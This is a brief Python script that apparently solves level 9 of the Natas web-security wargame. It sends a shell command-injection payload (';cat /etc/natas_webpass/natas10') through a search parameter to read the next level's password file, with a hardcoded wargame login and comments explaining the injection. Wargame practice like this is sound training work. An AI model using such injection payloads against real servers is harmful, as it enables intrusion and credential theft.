import requests
import config
import utils

"""
This one requires command line injection
1. insert the character 'a;cat'
    a. a starts the search
    b. ; terminates the command 
    c. cat ... is a command to output the contents of the specified path 
    d. # terminates the appended command
"""

username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'
auth = (username, password)
url = config.BASE_URL.format(username)

params = {
    'needle': 'a;cat /etc/natas_webpass/natas10+1 #',
    'submit': 'Search'
}

r = requests.get(url, auth=auth, params=params)

utils.save_file('out.txt', r.text)